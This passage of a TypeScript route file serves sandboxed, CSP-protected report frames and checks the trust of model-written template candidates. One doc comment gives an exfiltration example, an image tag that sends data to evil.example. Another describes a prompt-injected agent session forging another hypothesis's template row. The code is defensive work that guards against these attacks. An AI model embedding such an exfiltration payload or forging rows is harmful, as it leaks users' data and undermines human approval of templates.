/**
 * The three report routes (design/2026-08-20-agent-wolf.md, W21 —
 * § "HTTP routes added").
 *
 *   GET  /api/hypotheses/:id/report/frame
 *          → 200 text/html, the document `composeFrame` returned, carrying the
 *            `Content-Security-Policy` **that call derived for that template**
 *          → 404 not_found when no locked template exists (an empty state the
 *            UI distinguishes from a server error — a `kind`, not a blank frame)
 *   POST /api/hypotheses/:id/report-template     { html }
 *          → 201 { structure_hash } | 409 conflict | 422 invalid
 *   POST /api/hypotheses/:id/report-amendment    { amendment_id, decision, rationale }
 *          → 200 | 404 not_found | 422 invalid (and NO template written)
 *
 * ## The four things here that are correctness, not style
 *
 * 1. **The CSP is a HEADER and only a header.** `composeFrame` deliberately
 *    emits no `<meta http-equiv="Content-Security-Policy">` and `frame.test.ts`
 *    pins that. A meta policy silently ignores `sandbox` and `frame-ancestors`
 *    — two of the four directives `default-src` does not cover — and `sandbox`
 *    in the CSP is the entire reason direct navigation to this URL is safe: an
 *    `iframe sandbox=` attribute does nothing when a person pastes the frame
 *    URL into an address bar.
 *
 * 2. **The CSP comes back from the SAME `composeFrame` call that produced the
 *    body**, never from a second `frameCsp(...)` and never re-derived here.
 *    The policy is derived from the approved template (revision 5, R152: two
 *    lists at four positions), so a route emitting a constant policy would
 *    pass every W19 test and still be wrong. `strippedCount` is read from that
 *    same return value for the same reason — a second `sanitiseSlot` pass
 *    yields a second number that can disagree with the document served.
 *
 * 3. **The version-gated cache key carries the template's `structureHash`, not
 *    only the dataset versions.** The dataset version lives inside the series
 *    payload; an accepted amendment changes the template and no dataset, so a
 *    version-only key would serve the superseded frame for ever. See
 *    `frameCacheKey`.
 *
 * 4. **No credential is composed into the frame.** `composeFrame` is pure and
 *    cannot see config at all; this module hands it a template, slot content
 *    and a series payload, and nothing else. `report.test.ts` proves it at the
 *    ROUTE level, against the real app, because that is the only level at
 *    which the claim is about this file.
 *
 * ## What this file deliberately does not do
 *
 * It does not compute drift, a headline or a `report` block — those belong to
 * `GET /api/hypotheses/:id` and are W22's, in `routes/hypotheses.ts`. It reads
 * templates and reports through W15's `store.readTemplate` /
 * `store.readLatestReport` and nowhere else, so the trust rule and the
 * retraction rule have exactly one implementation: a forged `report-template`
 * (non-empty provenance) never reaches `composeFrame`, and the route answers
 * 404 rather than rendering it.
 */

import { Router, type Request, type Response } from "express";
import { z } from "zod";

import { WolfError } from "../errors.js";
import type { Logger } from "../logger.js";
import type { WolfConfig } from "../config.js";
import type { BobClient } from "../bob/client.js";
import type { MemoryRecord, MemorySearchResultRow } from "../bob/types.js";
import { requireSignedIn, signedInUser } from "../auth/session.js";
import type { Point } from "../hypothesis/evaluate.js";
import { parseCanonicalCsvBytes } from "../hypothesis/points.js";
import { extractSpecJsonText } from "../hypothesis/provision.js";
import { validateSpec, type Spec } from "../hypothesis/spec.js";
import {
  crossHypothesisTamper,
  hasEmptyProvenance,
  hostileRetractionTamper,
  isOwnReport,
  newestTrustedRow,
  reportOwnerFor,
  type HypothesisStore,
  type SessionLookup,
  type Tamper,
} from "../hypothesis/store.js";
import { codeOrigins, composeFrame, type SlotContent } from "../report/frame.js";
import { foreignDatasetLog, isOwnDataset } from "../hypothesis/datasettrust.js";
import {
  AMENDMENT_LABEL,
  AMENDMENT_STATUS_PROPOSED,
  KIND_REPORT_AMENDMENT,
  KIND_REPORT_CANDIDATE,
  LABEL_VALUE_PATTERN,
  MAX_LABEL_VALUE_LENGTH,
  buildReportAmendmentContent,
  buildReportTemplateContent,
  parseTemplateContent,
  reportDecisionLabels,
  reportSelector,
  reportTemplateLabels,
} from "../report/kinds.js";
import { validateTemplate } from "../report/sanitise.js";
import { buildSeriesPayload, type SeriesByMetric } from "../report/series.js";
import type { ParsedTemplate, TemplateError } from "../report/template.js";
import { requireHypothesisId } from "./embed.js";

/** `kind=hypothesis-spec` — the locked, trusted spec (§ "Memory kinds"). */
const KIND_SPEC = "hypothesis-spec";

/** One page of rows for one hypothesis of one kind; there are normally very few. */
const ROW_LIMIT = 50;

/**
 * How many hypotheses' composed frames, and how many datasets' parsed points,
 * are kept in memory. Both caches are keyed by something bounded (a hypothesis
 * id from the session index; a `<id>-<slug>` dataset name from a locked spec),
 * so the cap is about the SIZE of what is held — a frame document is the whole
 * template plus a day's slots — not about an attacker growing the key space.
 */
const DEFAULT_CACHE_MAX_ENTRIES = 128;

// ── Response shapes ─────────────────────────────────────────────────────
//
// snake_case on the wire, as everywhere else in this API.

export interface ReportTemplateResponse {
  /** sha256 of the stored bytes, lowercase hex — W16's `structureHash`. */
  structure_hash: string;
  /** The memory row the template was written to. */
  memory_id: string;
  /**
   * Every host this template will cause a browser to contact, sorted and
   * deduplicated, and every external script/stylesheet URL in document order.
   *
   * Returned because W24's go-live review screen renders "everything else" as
   * the SET DIFFERENCE of the two (§ 6b), and a W24 that re-parsed the
   * template to get them would be a second parser on the approval path — the
   * one path where the human's decision depends on the lists being the same
   * ones the CSP is derived from.
   */
  remote_origins: string[];
  script_srcs: string[];
}

/**
 * `GET /api/hypotheses/:id/report-candidate` — what the go-live review screen
 * reads (W24, R206).
 *
 * `kind=report-candidate` had a WRITER and no READER for nine tickets. This is
 * the reader, and the shape is driven entirely by what a human has to see
 * before their click LOCKS a template.
 *
 * 🔴 **`script_srcs` is not `code_origins` and the difference is the point.**
 * `script_srcs` is `parseTemplate`'s raw list — every `script[src]`,
 * `link[rel=stylesheet][href]` and CSS `@import` target, **in document order,
 * neither deduplicated nor sorted, and NOT https-only**. `code_origins` is
 * what W19 actually substitutes into `script-src`/`style-src`, derived by
 * `frame.ts`'s own `codeOrigins()`. A screen labelling the first list
 * "permitted script origins" would be lying to the human approving it
 * (R155): a CSS `@import url(data:…)` validates clean, lands in
 * `script_srcs`, and contributes no origin at all.
 *
 * 🔴 **`remote_origins` is the SUPERSET and it is the one that closes R116's
 * second gap.** A template exfiltrating through
 * `<img src="https://evil.example/?d=…">` carries no code, appears nowhere in
 * `script_srcs`, and was approved by a human who never saw the host. Every
 * origin here was seen by W16's validator — and per **R173** that is what the
 * validator saw, not a guarantee: SVG `fill`/`filter` is an unscanned channel.
 *
 * 🔴 **`html` is here and the locked frame's is NOT, and the asymmetry is
 * deliberate.** `composeReportStats` withholds the composed document because
 * the bytes are safe only inside the sandboxed frame the CSP header applies
 * to. These bytes are different: they are the body the accept button POSTs
 * back to `…/report-template`, so the client must hold them, and the round
 * trip must be byte-exact or the hash the human approved and the hash Wolf
 * locks would differ. They are never rendered as HTML — the PREVIEW comes
 * from `…/report-candidate/frame`, by URL, with the real CSP and the real
 * sandbox.
 */
export interface ReportCandidateResponse {
  /** The candidate row's Orange memory id. */
  memory_id: string;
  /** Line 1 of the candidate: the interview's own summary of what it proposes. */
  summary: string;
  /** Everything after line 1: the proposed template fragment, verbatim. */
  html: string;
  /** Unix **milliseconds** — the memory table's unit, not the `agent_*` tables' seconds. */
  created_at_ms: number;
  /** Provenance, carried through UNMODIFIED, for the § 2 `model` stamp. */
  created_by_worker: string;
  created_by_session: string;
  /** sha256 of `html`; `null` when the candidate does not validate. */
  structure_hash: string | null;
  /** Raw URLs, document order. See the note above: NOT the CSP's origin set. */
  script_srcs: string[];
  /** Every host the document will contact, sorted and deduplicated. */
  remote_origins: string[];
  /** The origins `script-src`/`style-src` will carry. A SUBSET of `remote_origins`, often equal. */
  code_origins: string[];
  /** False when the proposed template fails W16's validator; the errors say why. */
  valid: boolean;
  errors: TemplateError[];
  /** Cross-hypothesis writes and hostile retractions witnessed while reading. */
  tamper: Tamper[];
}

export interface ReportAmendmentResponse {
  id: string;
  amendment_id: string;
  decision: "accept" | "reject";
  /** The NEW `report-template` memory id on accept; `null` on reject. */
  template_memory_id: string | null;
  /** The accepted template's hash, so the caller can confirm what it locked. */
  structure_hash: string | null;
  /** The `report-amendment` row recording the HUMAN'S decision and rationale. Always written. */
  decision_memory_id: string;
}

/** One composed frame, plus the two facts a non-serving caller needs about it. */
interface ComposedReport {
  html: string;
  csp: string;
  strippedCount: number;
  structureHash: string;
  reportMemoryId: string | null;
}

/**
 * What `composeReportStats` returns: the compose FACTS, and deliberately not
 * the document. See that function for why `html` is absent.
 */
export interface ReportComposeStats {
  structureHash: string;
  /** DOMPurify records removed across every filled slot — the sign is the contract. */
  strippedCount: number;
  /** The `kind=report` row the slots came from; `null` when no tick has run. */
  reportMemoryId: string | null;
}

/**
 * The router, plus the one accessor another router needs.
 *
 * `createReportRouter` returns a PAIR rather than a bare `Router` so that
 * `composeReportStats` is bound to the same instance — and therefore the same
 * cache — as the mounted routes. A second `createReportRouter` call to obtain
 * one would be a second cache, which is the thing the accessor exists to
 * prevent.
 */
export interface ReportRouter {
  router: Router;
  composeReportStats: (
    id: string,
    options?: { sessions?: SessionLookup },
  ) => Promise<ReportComposeStats | null>;
}

// ── Bodies ──────────────────────────────────────────────────────────────

const templateBody = z.object({
  /** The template fragment, verbatim. Never trimmed — `structureHash` is sha256 of exactly these bytes. */
  html: z.string().min(1),
});

const amendmentBody = z.object({
  /**
   * The proposal's memory id.
   *
   * 🔴 Constrained to the K8s LABEL charset here, at the edge, for two
   * reasons that both bite. It is written as the `amendment` label of the
   * decision row, so a value that cannot be a label value would produce a row
   * nothing can find. And it is interpolated into a SELECTOR
   * (`…,amendment=<id>`) — a comma or an `=` in it would add or corrupt a
   * term, and since selector terms are ANDed, an injected term makes the
   * "already decided" query match NOTHING and silently re-opens the guard it
   * exists to enforce. Rejecting the shape is what stops both.
   */
  amendment_id: z
    .string()
    .min(1)
    .max(MAX_LABEL_VALUE_LENGTH)
    .regex(LABEL_VALUE_PATTERN, "must be a memory id (the Kubernetes label charset)"),
  decision: z.enum(["accept", "reject"]),
  /**
   * 🔴 **`.trim()` BEFORE `.min(1)`, and the omission was a live defect.**
   * `z.string().min(1)` accepts `"   "` (measured against the installed zod
   * 4), and the only thing that refused a blank line 1 was
   * `buildLineAndBody`, deep inside `writeDecision`. On the REJECT path that
   * is harmless — the decision is the first append. On ACCEPT, ruling 2's
   * template-first ordering puts it AFTER `appendMemory(template)`, so a
   * whitespace rationale **locked the template and then answered 400**: the
   * caller is told their request was invalid while the amendment has taken
   * effect, and no decision row exists, leaving a locked template that no
   * human is on record as accepting. That is the lying state the ordering
   * exists to prevent, reached from the other side.
   *
   * The rule is general: **every deep guard that can throw between the first
   * write and the last must be mirrored at the edge.** The two that can are
   * this one and `amendment_id`'s label charset, and both are now here.
   * `buildLineAndBody` stays as the deep guard for callers that are not this
   * route.
   */
  rationale: z.string().trim().min(1),
});

/** Mirrors `routes/hypotheses.ts`'s own private helper: one 400 with every issue at once. */
function parseBody<T>(schema: z.ZodType<T>, body: unknown, what: string): T {
  const parsed = schema.safeParse(body);
  if (!parsed.success) {
    throw new WolfError("invalid", `${what} is not a valid request body`, {
      details: {
        errors: parsed.error.issues.map((issue) => ({
          path: issue.path.join("."),
          message: issue.message,
        })),
      },
    });
  }
  return parsed.data;
}

/**
 * Validates HTML a CALLER submitted. A failure is the caller's, so it is a
 * **422** carrying every `{path, message}` at once.
 *
 * ⚠️ **`validateTemplate` alone cannot produce this**, and the difference is
 * the difference between the pinned contract and a 400. It throws W16's
 * `templateValidationError`, which is `kind: "invalid"` — and `invalid`'s
 * DEFAULT status is **400** (`errors.ts`), while § "HTTP routes added" pins
 * template validation failure at **422**. So the kind is right and the status
 * is not, and this re-wraps rather than inventing a second validator: the
 * `details` are carried across untouched, exactly as W9's `specRejection` does
 * for a spec. `sanitise.ts`'s own header says this function exists so "W21's
 * route renders one 422"; that is true only with this wrapper in front of it.
 */
function validateSubmittedTemplate(html: string, maxBytes: number, message: string): ParsedTemplate {
  try {
    return validateTemplate(html, maxBytes);
  } catch (err) {
    if (err instanceof WolfError && err.kind === "invalid") {
      throw new WolfError("invalid", message, { status: 422, details: err.details });
    }
    throw err;
  }
}

/**
 * Validates HTML this server previously STORED, which is a different failure
 * with a different owner.
 *
 * A locked `report-template` passed `validateSubmittedTemplate` before it was
 * written, so one that no longer validates means Wolf's own stored state is
 * unusable — a validator change, or a write path that skipped validation.
 * `internal` is the right kind for that (§ "Shared error taxonomy": an
 * unrecognised state is `internal`, and `internal` is NOT retryable, which is
 * also correct — retrying cannot fix a stored document). It is emphatically
 * NOT `invalid`: the caller sent nothing, and a 400 tells a browser to fix a
 * request it cannot fix. The real errors are logged server-side with the
 * memory id; `internal`'s message never reaches the client (R39).
 */
/**
 * The `{path, message}` list out of a `templateValidationError`'s details bag.
 *
 * Defensive on every step because `details` is `unknown`: an error carrying
 * none, or one whose `errors` is not an array, yields `[]` rather than
 * throwing inside a catch block. Written once because two callers need it —
 * the stored-template path logs them, and W24's candidate read shows them to
 * the human who has to fix the template.
 */
function templateErrorsOf(err: WolfError): TemplateError[] {
  const details = err.details;
  if (typeof details !== "object" || details === null) return [];
  const errors = (details as { errors?: unknown }).errors;
  return Array.isArray(errors) ? (errors as TemplateError[]) : [];
}

function parseStoredTemplate(
  html: string,
  maxBytes: number,
  onFailure: (errors: TemplateError[]) => void,
): ParsedTemplate {
  try {
    return validateTemplate(html, maxBytes);
  } catch (err) {
    if (err instanceof WolfError && err.kind === "invalid") {
      onFailure(templateErrorsOf(err));
      // No `details`: the shared handler strips an `internal` message and
      // this error's details would name the template's own contents.
      throw new WolfError("internal", "the stored report template no longer validates", {
        cause: err,
      });
    }
    throw err;
  }
}

// ── Caches ──────────────────────────────────────────────────────────────

/** One dataset's parsed points, at the version they were downloaded at. */
interface CachedSeries {
  version: number;
  points: Point[];
}

/** One hypothesis's composed frame, and the key that says when it is stale. */
interface CachedFrame {
  key: string;
  html: string;
  csp: string;
  strippedCount: number;
}

/**
 * Insert-or-refresh with a size cap, evicting the least recently WRITTEN
 * entry. `Map` preserves insertion order and `delete`-then-`set` moves an
 * entry to the end, which is the whole mechanism.
 *
 * A `Map` rather than a plain object throughout this file is not decoration:
 * dataset names embed a metric slug chosen by a model, and `LABEL_VALUE_PATTERN`
 * admits seven `Object.prototype` keys (`constructor`, `toString`, …) — the
 * class that has already produced two live defects here (R156/R160, and
 * `spec.ts`'s `present()`).
 */
function cachePut<V>(map: Map<string, V>, key: string, value: V, max: number): void {
  map.delete(key);
  map.set(key, value);
  while (map.size > max) {
    const oldest = map.keys().next();
    if (oldest.done === true) break;
    map.delete(oldest.value);
  }
}

/**
 * What the served frame is a function of, and therefore what must change for
 * a cached one to be re-composed.
 *
 * 🔴 **`structureHash` is in this key and dropping it is a silent, permanent
 * defect.** The dataset versions live inside the series payload, so a
 * version-only key looks complete — and an accepted amendment changes the
 * TEMPLATE and no dataset, so the route would serve the superseded document
 * for ever, with no error anywhere. § "HTTP routes added", note 3.
 *
 * The report memory id is here for the same reason from the other direction:
 * the daily tick appends a NEW `kind=report` row rather than editing one, so
 * its id changing is exactly "there is new slot content today".
 */
function frameCacheKey(
  structureHash: string,
  reportMemoryId: string | null,
  versions: readonly (readonly [string, number])[],
): string {
  return JSON.stringify([structureHash, reportMemoryId, versions]);
}

// ── The router ──────────────────────────────────────────────────────────

export interface CreateReportRouterOptions {
  store: HypothesisStore;
  client: BobClient;
  config: WolfConfig;
  logger: Logger;
  /** Both caches' size cap; injectable so the eviction path is testable. */
  cacheMaxEntries?: number;
}

export function createReportRouter(options: CreateReportRouterOptions): ReportRouter {
  const { store, client, config, logger } = options;
  const cacheMax = options.cacheMaxEntries ?? DEFAULT_CACHE_MAX_ENTRIES;
  const router = Router();

  /** `<dataset name>` → its parsed points at a version. */
  const seriesCache = new Map<string, CachedSeries>();
  /** `<hypothesis id>` → the last frame composed for it. */
  const frameCache = new Map<string, CachedFrame>();

  /**
   * The newest TRUSTED locked spec, or `undefined`.
   *
   * The same read `routes/series.ts` makes, through the same shared helpers —
   * `newestTrustedRow`, `extractSpecJsonText`, `validateSpec` — rather than a
   * second trust rule. It is a fourth private copy of that read (the poller
   * and both routers have one) and it is NOT lifted into `hypothesis/store.ts`
   * here: § "Parallelism and file ownership" gives that file to W5, W8, W15,
   * W10, W22 and W27, and this ticket owns neither it nor `series.ts`.
   *
   * A hypothesis with no locked spec still gets a frame — the template is
   * reviewable before go-live — with an EMPTY series payload rather than an
   * error. `window.__WOLF_SERIES__` is then `{}`, and a template's chart code
   * sees no metrics rather than a missing global.
   */
  async function readLockedSpec(id: string, sessions: SessionLookup): Promise<Spec | undefined> {
    const rows: MemorySearchResultRow[] = await client.listMemories({
      selector: `kind=${KIND_SPEC},name=${id}`,
      limit: ROW_LIMIT,
      includeRetracted: true,
    });
    const row = newestTrustedRow(rows, sessions);
    if (row === undefined) return undefined;
    const full = await client.getMemoryById(row.id);
    const json = extractSpecJsonText(full.content);
    if (json === undefined) return undefined;
    let parsed: unknown;
    try {
      parsed = JSON.parse(json);
    } catch {
      return undefined;
    }
    const result = validateSpec(parsed);
    return result.valid ? result.spec : undefined;
  }

  /**
   * Every metric's dataset VERSION, without downloading a byte.
   *
   * This is the gate: the metadata route answers with the current version, and
   * the CSV is downloaded only when that version is not the one already
   * parsed. A dataset that has never been written contributes no entry at all,
   * which is what makes `buildSeriesPayload` emit `version: 0` and empty
   * points for it rather than dropping the metric.
   *
   * `not_found` and `unavailable` stay distinguishable, exactly as in the
   * series proxy: an outage must not read as a metric that was never written.
   */
  async function readVersions(id: string, spec: Spec | undefined): Promise<Map<string, number>> {
    const versions = new Map<string, number>();
    if (spec === undefined) return versions;
    await Promise.all(
      spec.metrics.map(async (metric) => {
        const name = `${id}-${metric.slug}`;
        try {
          const metadata = await client.getDataset(name);
          // 🔴 A dataset any session in the project may have written is not
          // evidence about THIS hypothesis until its writer is checked. A
          // foreign series is dropped rather than charted: the report frame
          // is a trusted surface and must not draw another container's
          // numbers under this hypothesis's name. See `datasettrust.ts`.
          if (!isOwnDataset(metadata, id)) {
            logger.warn(
              foreignDatasetLog(metadata, id, name),
              "report: dataset was written by a foreign worker — REFUSING to chart it",
            );
            seriesCache.delete(name);
            return;
          }
          versions.set(metric.slug, metadata.version);
        } catch (err) {
          if (err instanceof WolfError && err.kind === "not_found") {
            // Never written. Not an error, and not a stale cache either: drop
            // any points we hold, or a dataset that was deleted upstream would
            // keep rendering from memory.
            seriesCache.delete(name);
            return;
          }
          throw err;
        }
      }),
    );
    return versions;
  }

  /**
   * The points behind those versions, downloading only what changed.
   *
   * A malformed CSV throws W10's typed `invalid` naming the offending line
   * rather than yielding an empty series — the same decision `routes/series.ts`
   * documents. A silent empty chart is the failure mode the whole series/state
   * vocabulary exists to abolish, and the writer here is a model.
   */
  async function readSeries(id: string, versions: ReadonlyMap<string, number>): Promise<SeriesByMetric> {
    const byMetric: SeriesByMetric = {};
    await Promise.all(
      [...versions].map(async ([slug, version]) => {
        const name = `${id}-${slug}`;
        const cached = seriesCache.get(name);
        if (cached !== undefined && cached.version === version) {
          byMetric[slug] = { points: cached.points, version };
          return;
        }
        // Pinned to the version the metadata just named, so a `dataset_put`
        // landing between the two requests cannot hand back bytes from a
        // version other than the one this frame is keyed on.
        const download = await client.downloadDataset(name, { version });
        const points = parseCanonicalCsvBytes(download.body, name);
        cachePut(seriesCache, name, { version, points }, cacheMax);
        byMetric[slug] = { points, version };
      }),
    );
    return byMetric;
  }

  // ── GET /api/hypotheses/:id/report/frame ──────────────────────────────

  /**
   * Compose one hypothesis's frame, through the ONE cache.
   *
   * Both the frame route and the exported `composeReportStats` go through
   * here, which is what makes `strippedCount` a single number in this process
   * rather than one per caller. `null` means no locked template exists — the
   * empty state, which each caller renders in its own way.
   *
   * `sessions` may be supplied by a caller that already holds a session index
   * (W22's detail route does), which saves the session-list walk.
   */
  async function composeFor(id: string, sessions?: SessionLookup): Promise<ComposedReport | null> {
    // ONE session index for all three reads below: `readTemplate`,
    // `readLatestReport` and the spec's trust rule all need the same answer,
    // and each would otherwise walk the session list itself.
    const index = sessions ?? (await store.readSessionIndex());

    const { template, tamper } = await store.readTemplate(id, { sessions: index });
    if (template === null) return null;
    if (tamper.length > 0) {
      logger.warn({ id, tamper }, "report frame: tamper detected on the template row");
    }

    const { report } = await store.readLatestReport(id, { sessions: index });
    const spec = await readLockedSpec(id, index);
    const versions = await readVersions(id, spec);

    const key = frameCacheKey(template.structureHash, report?.memoryId ?? null, [...versions]);
    const cached = frameCache.get(id);
    if (cached !== undefined && cached.key === key) {
      // Nothing downloaded, nothing parsed, nothing sanitised.
      logger.debug({ id, cached: true }, "report frame served from cache");
      return {
        html: cached.html,
        csp: cached.csp,
        strippedCount: cached.strippedCount,
        structureHash: template.structureHash,
        reportMemoryId: report?.memoryId ?? null,
      };
    }

    const parsed = parseStoredTemplate(template.html, config.reportMaxBytes, (errors) => {
      logger.error(
        { id, memory_id: template.memoryId, errors },
        "report frame: the stored template no longer validates",
      );
    });

    const seriesByMetric = await readSeries(id, versions);
    const series =
      spec === undefined ? {} : buildSeriesPayload(spec, seriesByMetric, config.seriesMaxPoints);

    // `composeFrame` sanitises the slots itself — a caller cannot forget,
    // because a caller never gets the chance — and returns the CSP it derived
    // for THIS template alongside the document.
    const slots: SlotContent = report?.slots ?? {};
    const composed = composeFrame({ template: parsed, slots, series });

    cachePut(
      frameCache,
      id,
      { key, html: composed.html, csp: composed.csp, strippedCount: composed.strippedCount },
      cacheMax,
    );

    logger.info(
      {
        id,
        structure_hash: template.structureHash,
        report_memory_id: report?.memoryId ?? null,
        // The SIGN is the contract, not the magnitude (§ "The detail route's
        // report block, pinned"): it counts DOMPurify records, nodes and
        // attributes alike, so a library upgrade moves it.
        stripped_count: composed.strippedCount,
        metrics: versions.size,
        cached: false,
      },
      "report frame composed",
    );

    return {
      html: composed.html,
      csp: composed.csp,
      strippedCount: composed.strippedCount,
      structureHash: template.structureHash,
      reportMemoryId: report?.memoryId ?? null,
    };
  }

  /**
   * What a caller that is NOT serving the document gets — W22's detail route,
   * for the pinned `report.stripped_count`.
   *
   * 🔴 **It exists so there is exactly ONE `stripped_count` in this process.**
   * The number can only come out of `composeFrame`, which lives behind this
   * router's cache; without this accessor W22's only options are to duplicate
   * the sanitiser (§ "HTTP routes added" note 2 forbids it, and the two
   * numbers agree almost always, which is what makes the duplication
   * dangerous) or to omit a field the detail block pins as mandatory. Going
   * through `composeFor` means the number describes the document the frame
   * route actually serves, on the same cache entry.
   *
   * 🔴 **`html` is deliberately NOT returned**, and that is a security
   * boundary rather than a size decision. The document is safe only inside the
   * sandboxed frame the CSP header applies to; a caller holding the HTML could
   * put it in a JSON payload and the SPA would render it with no sandbox, no
   * `frame-ancestors` and no opaque origin. The bytes leave this process
   * through `GET …/report/frame` and nowhere else.
   *
   * `null` when no locked template exists — the same empty state the frame
   * route answers 404 for, which the detail block reports as
   * `has_template: false`.
   */
  async function composeReportStats(
    id: string,
    options: { sessions?: SessionLookup } = {},
  ): Promise<ReportComposeStats | null> {
    const composed = await composeFor(id, options.sessions);
    if (composed === null) return null;
    return {
      structureHash: composed.structureHash,
      strippedCount: composed.strippedCount,
      reportMemoryId: composed.reportMemoryId,
    };
  }

  router.get(
    "/api/hypotheses/:id/report/frame",
    // PER ROUTE and before the handler (R79), so a caller with no cookie is
    // refused without a single upstream request.
    requireSignedIn,
    (req: Request, res: Response, next) => {
      void (async () => {
        const id = requireHypothesisId(req.params["id"]);
        const composed = await composeFor(id);
        if (composed === null) {
          // The EMPTY STATE, and the UI must be able to tell it from a server
          // error: `kind: "not_found"` in a JSON body, never a blank 200 frame
          // and never a 500. A template hidden by a hostile retraction does
          // NOT arrive here — `readTemplate` serves it and flags it — so this
          // branch really does mean "nobody has authored one".
          throw new WolfError("not_found", `hypothesis ${id} has no locked report template`, {
            details: { id, reason: "no_report_template" },
          });
        }
        send(res, composed.html, composed.csp);
      })().catch(next);
    },
  );

  /**
   * The one place the frame's headers are set.
   *
   * 🔴 The CSP is a HEADER and only a header, and it is the value that came
   * back from `composeFrame` — the policy is derived from the approved
   * template, so a constant one here would be wrong while every W19 test still
   * passed. `nosniff` because the document is composed from model-authored
   * slot content; a browser that content-sniffed its way to another type would
   * step around the `text/html` the whole policy is written for.
   *
   * `Cache-Control: private, no-store` because this response is authenticated
   * and hypothesis-specific: the caching that matters is the server-side frame
   * cache above, not a shared proxy holding one user's report.
   *
   * Nothing here sets a cookie, and `report.test.ts` asserts the response
   * carries no `Set-Cookie` at all — a session middleware that later refreshed
   * a cookie onto this response would put a credential into the one document
   * that is allowed to hold none.
   */
  function send(res: Response, html: string, csp: string): void {
    res.setHeader("Content-Security-Policy", csp);
    res.setHeader("X-Content-Type-Options", "nosniff");
    res.setHeader("Cache-Control", "private, no-store");
    res.status(200).type("html").send(html);
  }

  // ── POST /api/hypotheses/:id/report-template ──────────────────────────

  router.post(
    "/api/hypotheses/:id/report-template",
    requireSignedIn,
    (req: Request, res: Response, next) => {
      void (async () => {
        const user = signedInUser(req);
        const id = requireHypothesisId(req.params["id"]);
        const body = parseBody(
          templateBody,
          req.body,
          "POST /api/hypotheses/:id/report-template",
        );

        // 404s when the id is not in the session index, exactly as every other
        // per-hypothesis read does — the session list is the authoritative
        // index of hypotheses, never memory.
        const existing = await store.readTemplate(id);
        if (existing.template !== null) {
          // 🔴 Checked BEFORE validation, and the order is the contract: an
          // existing template is a `conflict` whatever the submitted HTML
          // says, because the amendment route is the only replacement path
          // (§ "HTTP routes added", note 4 — "a template that already exists
          // is never `invalid`"). Validating first would answer 422 for a
          // caller whose real problem is that they cannot POST here at all.
          throw new WolfError(
            "conflict",
            `hypothesis ${id} already has a locked report template; propose an amendment instead`,
            {
              details: {
                id,
                structure_hash: existing.template.structureHash,
                memory_id: existing.template.memoryId,
              },
            },
          );
        }

        const parsed = validateSubmittedTemplate(
          body.html,
          config.reportMaxBytes,
          "the report template is not valid",
        );

        // Written with WOLF'S OWN server credential, so the row's provenance
        // is empty and `isTrusted` accepts it. That is the whole reason
        // `report-template` can be a trusted kind: nothing inside a container
        // can produce a row with empty provenance.
        const memory = await client.appendMemory({
          labels: reportTemplateLabels(id),
          content: buildReportTemplateContent({
            structureHash: parsed.structureHash,
            html: parsed.html,
          }),
          embed: false,
        });

        logger.info(
          {
            id,
            memory_id: memory.id,
            structure_hash: parsed.structureHash,
            slots: parsed.slotIds.length,
            remote_origins: parsed.remoteOrigins.length,
            by: user.email,
          },
          "report template locked",
        );

        const response: ReportTemplateResponse = {
          structure_hash: parsed.structureHash,
          memory_id: memory.id,
          remote_origins: parsed.remoteOrigins,
          script_srcs: parsed.scriptSrcs,
        };
        res.status(201).json(response);
      })().catch(next);
    },
  );

  // ── GET /api/hypotheses/:id/report-candidate (+ /frame) ───────────────

  /** One `kind=report-candidate` row, read in full. */
  interface CandidateRecord {
    memoryId: string;
    /** Line 1: the interview's summary of what it is proposing. */
    summary: string;
    /** Everything after line 1: the proposed template fragment. */
    html: string;
    createdAtMs: number;
    createdByWorker: string;
    createdBySession: string;
  }

  /**
   * The newest `report-candidate` this hypothesis OWNS, plus what was
   * witnessed on the way to it.
   *
   * 🔴 **`isTrusted` is the WRONG rule here and using it would reject every
   * legitimate candidate.** A candidate is written by the interviewer from
   * inside the container, so its provenance is never empty and clause 1 of
   * the trust model always fails. The rule that applies is W22's
   * `isOwnReport`, the same one `kind=report` gets: the row's provenance must
   * name this hypothesis's own `researcher-<id>` worker or its `hyp-<id>`
   * session, both stamped by Orange from the caller's credential and neither
   * settable from a request body. Anything else is a `cross_hypothesis_write`
   * — a prompt-injected session running for hypothesis A appending
   * `kind=report-candidate, name=B` — and **this is the worst place in the
   * product to skip that check, because the human's next click LOCKS the
   * template**.
   *
   * ⚠️ It re-implements `store.ts`'s `pickSurvivingRow` loop rather than
   * calling it, and that is a limitation rather than a choice:
   * `pickSurvivingRow` is private to `createHypothesisStore`, `store.ts` is
   * another ticket's file this wave, and there is no `readCandidate` on the
   * store to call. Every rule it applies comes from the SHARED exported
   * primitives — `isOwnReport`, `reportOwnerFor`, `crossHypothesisTamper`,
   * `hostileRetractionTamper`, `hasEmptyProvenance` — so the trust boundary
   * itself is not duplicated, only the walk over rows.
   *
   * ⚠️ An earlier version of this comment said `readLockedSpec` above "already
   * has the same shape, for the same reason". It does not: that function
   * re-implements no loop at all, because the read it needs — the newest
   * TRUSTED row — is already exported as `newestTrustedRow`. There is no
   * exported equivalent for "the newest row this hypothesis OWNS", and that
   * absence is the whole reason this loop exists. Adding one means editing
   * `store.ts`.
   */
  async function readCandidate(
    id: string,
    sessions: SessionLookup,
  ): Promise<{ record: CandidateRecord | null; tamper: Tamper[] }> {
    const rows = await client.listMemories({
      selector: reportSelector(KIND_REPORT_CANDIDATE, id),
      limit: ROW_LIMIT,
      // Without it Orange filters retracted rows server-side, so a retraction
      // written from INSIDE A CONTAINER hides the candidate and the screen
      // says "the interview has not produced one yet" — an erasure
      // indistinguishable from the empty state.
      includeRetracted: true,
    });

    const owner = reportOwnerFor(id, sessions);
    const tamper: Tamper[] = [];
    const add = (t: Tamper): void => {
      if (tamper.some((x) => x.reason === t.reason && x.memory_id === t.memory_id)) return;
      tamper.push(t);
    };

    let winner: MemorySearchResultRow | null = null;
    for (const row of rows) {
      if (row.labels["name"] !== id) continue;
      if (!isOwnReport(row, owner)) {
        add(crossHypothesisTamper(row));
        continue;
      }
      let withdrawnByWolf = false;
      for (const retraction of row.retractedBy ?? []) {
        // A retraction WOLF wrote (empty provenance) really withdraws the row.
        // One written inside a container does not — it is reported instead.
        if (hasEmptyProvenance(retraction)) withdrawnByWolf = true;
        else add(hostileRetractionTamper(retraction));
      }
      if (withdrawnByWolf) continue;
      // Keep scanning after the winner: an anomaly on an OLDER row is still an
      // anomaly, and dropping it is how a forgery goes silent on one surface
      // while another still names it.
      if (winner === null) winner = row;
    }

    if (winner === null) return { record: null, tamper };

    // A second request, deliberately: the list route returns
